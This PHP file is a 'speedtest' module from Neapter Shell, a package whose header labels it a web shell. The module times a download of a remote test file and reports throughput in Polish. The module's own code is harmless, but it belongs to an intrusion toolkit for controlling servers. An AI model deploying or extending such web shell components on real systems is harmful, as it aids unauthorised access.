<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Test network speed
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleSpeedtest extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('speedtest');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Test prędkości łącza

	Użycie:
		speedtest [adres_do_zdalnego_pliku_http]

	Przykład:
		speedtest http://mirror.widexs.nl/ftp/pub/speed/1mb.bin
		speedtest http://mirror.widexs.nl/ftp/pub/speed/10mb.bin
		speedtest http://mirror.widexs.nl/ftp/pub/speed/100mb.bin

DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() > 1) {
            return self::getHelp();
        }

        $sUrl = $this->oArgs->getParam(0);

        if (!$sUrl) {
            $sUrl = 'http://mirror.widexs.nl/ftp/pub/speed/10mb.bin';
        }

        if (strncmp($sUrl, 'http://', 7) !== 0) {
            return 'Wspierany jest tylko protokół http!';
        }

        $aStream = array(
            'http' => array(
                'method' => 'GET',
                'header' => "Connection: Close\r\n"
            )
        );

        $rFp = @ fopen($sUrl, 'r', false, stream_context_create($aStream));

        if (!$rFp) {
            return 'Nie można pobrać pliku!';
        }

        stream_set_timeout($rFp, 15);

        $fTime = microtime(1);
        $iTotal = 0;

        /* Skip HTTP header */
        fread($rFp, 32768);

        while (!feof($rFp)) {
            $iTotal += strlen(fread($rFp, 32768));

            /* Run benchmark for 5 seconds */
            if ((microtime(1) - $fTime) >= 5) {
                break;
            }
        }

        fclose($rFp);

        return sprintf(
            "Pobrano: %.2f KB w %.2f sekund\r\nŚrednia prędkość: %.2f KB/s",
            $iTotal / 1024,
            $fTime = microtime(1) - $fTime,
            ($iTotal / $fTime) / 1024
        );
    }
}
